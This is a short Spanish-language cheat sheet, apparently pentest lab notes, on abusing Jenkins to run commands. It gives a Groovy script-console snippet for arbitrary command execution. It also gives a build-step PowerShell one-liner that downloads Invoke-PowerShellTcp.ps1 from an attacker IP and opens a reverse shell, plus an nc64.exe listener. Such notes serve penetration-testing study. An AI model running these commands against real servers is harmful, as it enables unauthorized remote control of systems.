# Feature Abuse 

Tags: #AD #Windows #Jenkins #PrivEsc 

## Jenkins 

```bash 
Si hay una versión antigua es porbable que sea una aplicación de empresa vulnerable. El servidor Jenkins es ejecutado en el 'dcorp-ci' por el puerto '8080' 

Aparte de numerosos plugins, hay dos maneras de ejecutar comandos en un 'Jenkins Master'
```

## Forma 1 

```powershell 
1. Si se tiene acceso 'Admin' la cual viene instalada en las versiones <2.x 
❯ http://<jenkins_server>/script 

En la consola, Groovy scripts pueden ser ejecutados 

	def sout = new StringBuffer(), serr = new StringBuffer()
	def proc = '[INSERT COMMAND]'.execute()
	proc.consumeProcessOutput(sout, serr)
	proc.waitForOrkill(1000)
	println "out> $sout err> $serr"
	
```

## Forma 2 

```powershell 
2. Si no se tiene permisos de 'Admin' pero se puede agregar o editar 'build steps' en la configuración.

- Se debe tener credenciales validas para acceder al 'login'
- Mirar si se esta en un 'Jenkins Master' mirando la parte de 'Buil Executor Status' donde aparece 'Built-In Node'
- Ir a algún proyecto, luego 'Configure > Add build step > Execute Windows batch command'. Se puede descargar, ejecutar scripts, correr scripts encodeados y más 


❯ powershell iex (iwr -UseBasicParsing http://IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress IP_Attack -Port 443    # Descargar y ejecutar el script para crear una Revershell en Jenkins 

❯ nc64.exe -lvp 443    # Colocarse en escucha para recibir la Revershell con Powershell en la maquina de atacante de Windows

Notas:
	1. Para compartir el script de 'Invoke-PowerShelTcp.ps1' se puede ejecutar en la máquina de atacante Windows el programa de 'hfs.exe'
```
